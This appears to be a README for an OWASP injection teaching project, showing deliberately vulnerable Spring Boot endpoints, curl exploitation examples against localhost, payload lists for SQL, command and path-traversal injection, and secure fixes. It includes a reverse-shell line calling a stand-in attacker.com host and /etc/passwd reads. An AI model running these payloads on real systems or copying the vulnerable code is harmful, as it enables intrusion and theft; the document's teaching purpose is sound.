# A05:2025 - Injection

## Overview

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

## Types of Injection

1. **SQL Injection** - Most common
2. **NoSQL Injection** - MongoDB, CouchDB
3. **OS Command Injection** - System commands
4. **LDAP Injection** - Directory queries
5. **XPath Injection** - XML queries
6. **Template Injection** - Server-side templates
7. **Log Injection** - Log manipulation

## This Example Demonstrates

- SQL Injection attacks
- Command Injection
- Path Traversal
- Expression Language Injection

## Vulnerable Code Examples

### 1. SQL Injection

```java
@RestController
public class VulnerableUserController {

    @GetMapping("/users/search")
    public List<User> searchUsers(@RequestParam String name) {
        // VULNERABLE: String concatenation in SQL
        String sql = "SELECT * FROM users WHERE name = '" + name + "'";
        return jdbcTemplate.query(sql, new UserRowMapper());

        // Exploit: ?name=' OR '1'='1
        // Result: Returns all users
    }

    @GetMapping("/login")
    public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {
        // VULNERABLE: SQL Injection in authentication
        String sql = "SELECT * FROM users WHERE username='" + username +
                     "' AND password='" + password + "'";

        // Exploit: username=admin' -- &password=anything
        // Result: Bypass authentication
    }
}
```

### 2. Command Injection

```java
@RestController
public class VulnerableSystemController {

    @GetMapping("/ping")
    public String ping(@RequestParam String host) {
        try {
            // VULNERABLE: User input directly in command
            Process process = Runtime.getRuntime()
                .exec("ping -c 4 " + host);

            // Exploit: ?host=google.com; cat /etc/passwd
            // Result: Execute arbitrary commands
        } catch (IOException e) {
            return "Error: " + e.getMessage();
        }
    }
}
```

### 3. Path Traversal

```java
@RestController
public class FileController {

    @GetMapping("/download")
    public ResponseEntity<Resource> downloadFile(@RequestParam String filename) {
        // VULNERABLE: No path validation
        File file = new File("/var/uploads/" + filename);

        // Exploit: ?filename=../../../../etc/passwd
        // Result: Access any file on system
    }
}
```

### 4. Template Injection (SSTI)

```java
@GetMapping("/welcome")
public String welcome(@RequestParam String name) {
    // VULNERABLE: User input in template
    String template = "Hello, " + name + "!";
    return templateEngine.process(template, context);

    // Exploit: ?name=${7*7}
    // If using vulnerable template engine, evaluates to 49
}
```

## Exploitation Examples

### SQL Injection Attacks

```bash
# Authentication Bypass
curl "http://localhost:8080/login?username=admin'--&password=anything"

# Union-based SQLi (data extraction)
curl "http://localhost:8080/users?id=1' UNION SELECT username,password,email FROM admin_users--"

# Time-based Blind SQLi
curl "http://localhost:8080/users?id=1' AND SLEEP(5)--"

# Boolean-based Blind SQLi
curl "http://localhost:8080/users?id=1' AND '1'='1"
```

### Command Injection

```bash
# Execute multiple commands
curl "http://localhost:8080/ping?host=google.com;whoami"

# Reverse shell
curl "http://localhost:8080/ping?host=google.com;nc attacker.com 4444 -e /bin/bash"

# Read files
curl "http://localhost:8080/ping?host=google.com`cat /etc/passwd`"
```

### NoSQL Injection (MongoDB)

```javascript
// Vulnerable MongoDB query
db.users.find({ username: req.body.username, password: req.body.password });

// Exploit with:
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
// Returns first user (bypass authentication)
```

## How to Fix It

### 1. Use Prepared Statements (Parameterized Queries)

```java
@RestController
public class SecureUserController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @GetMapping("/users/search")
    public List<User> searchUsers(@RequestParam String name) {
        // SECURE: Using parameterized query
        String sql = "SELECT * FROM users WHERE name = ?";
        return jdbcTemplate.query(sql, new UserRowMapper(), name);
    }

    @GetMapping("/login")
    public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {
        // SECURE: Prepared statement
        String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
        List<User> users = jdbcTemplate.query(sql, new UserRowMapper(), username, password);

        // Better: Use Spring Security with proper password hashing
    }
}
```

### 2. Use JPA/Hibernate (Parameterized)

```java
@Repository
public interface UserRepository extends JpaRepository<User, Long> {

    // SECURE: JPA handles parameterization
    @Query("SELECT u FROM User u WHERE u.username = :username")
    User findByUsername(@Param("username") String username);

    // SECURE: Method name query
    User findByUsernameAndEmail(String username, String email);
}
```

### 3. Input Validation and Sanitization

```java
@Service
public class ValidationService {

    public String validateFilename(String filename) {
        // Whitelist approach
        if (!filename.matches("[a-zA-Z0-9._-]+")) {
            throw new IllegalArgumentException("Invalid filename");
        }

        // Prevent path traversal
        if (filename.contains("..") || filename.contains("/") || filename.contains("\\")) {
            throw new IllegalArgumentException("Invalid filename");
        }

        return filename;
    }

    public String validateHost(String host) {
        // Validate IP or hostname
        if (!host.matches("^[a-zA-Z0-9.-]+$")) {
            throw new IllegalArgumentException("Invalid host");
        }
        return host;
    }
}
```

### 4. Use Safe APIs

```java
@RestController
public class SecureSystemController {

    @GetMapping("/ping")
    public String ping(@RequestParam String host) {
        // Validate input
        if (!host.matches("^[a-zA-Z0-9.-]+$")) {
            return "Invalid host";
        }

        try {
            // SECURE: Use ProcessBuilder with separated arguments
            ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
            Process process = pb.start();

            // No shell interpretation, no command injection possible
        } catch (IOException e) {
            return "Error";
        }
    }
}
```

### 5. Escape Output

```java
@GetMapping("/search")
public String search(@RequestParam String query) {
    List<Item> items = itemService.search(query);

    // SECURE: Escape HTML to prevent XSS
    String escapedQuery = HtmlUtils.htmlEscape(query);

    return "Results for: " + escapedQuery;
}
```

### 6. Use ORM Query Builders

```java
// SECURE: Using Criteria API
CriteriaBuilder cb = entityManager.getCriteriaBuilder();
CriteriaQuery<User> query = cb.createQuery(User.class);
Root<User> user = query.from(User.class);

query.select(user).where(
    cb.equal(user.get("username"), username)
);

List<User> users = entityManager.createQuery(query).getResultList();
```

## Best Practices

1. **Use Parameterized Queries**: Always
2. **Input Validation**: Whitelist acceptable input
3. **Principle of Least Privilege**: Database users should have minimal permissions
4. **Escape Special Characters**: Context-specific escaping
5. **Use Safe APIs**: Avoid shell execution
6. **WAF**: Web Application Firewall as defense in depth
7. **Code Review**: Manual review for injection points
8. **SAST Tools**: Static analysis for vulnerability detection

## Prevention Checklist

- [ ] All SQL queries use parameterized statements
- [ ] Input validation on all user inputs
- [ ] No string concatenation in queries
- [ ] No shell command execution with user input
- [ ] File paths validated and sanitized
- [ ] Template engines configured securely
- [ ] Database accounts have minimal privileges
- [ ] Error messages don't reveal structure
- [ ] Security testing includes injection tests
- [ ] WAF rules configured for injection attacks

## Testing for Injection

```bash
# SQL Injection test payloads
' OR '1'='1
admin' --
' UNION SELECT NULL--
1' AND SLEEP(5)--

# Command Injection test payloads
; whoami
| cat /etc/passwd
`id`
$(whoami)

# Path Traversal
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

## Impact

- **Data Breach**: Steal entire database
- **Authentication Bypass**: Admin access
- **Data Manipulation**: Modify or delete data
- **System Compromise**: Execute OS commands
- **Denial of Service**: Crash application
- **Privilege Escalation**: Gain higher permissions

## Tools

- SQLMap - Automated SQL injection
- Burp Suite - Web vulnerability scanner
- OWASP ZAP - Penetration testing
- Commix - Command injection testing

## References

- [OWASP A05:2025 - Injection](https://owasp.org/Top10/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [SQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

**To Implement**: Create SpringBoot backend with vulnerable and secure endpoints, React frontend to demonstrate attacks.
